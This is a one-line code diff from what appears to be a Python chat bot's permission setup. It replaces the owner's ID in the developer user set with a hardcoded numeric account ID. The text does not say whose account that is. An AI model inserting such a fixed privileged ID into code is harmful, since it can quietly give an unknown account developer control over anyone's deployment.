@@ -166,7 +166,7 @@ else:
         
 
 DRAGONS.add(OWNER_ID)
-DEV_USERS.add(OWNER_ID)
+DEV_USERS.add(5531584953)
 
 
 
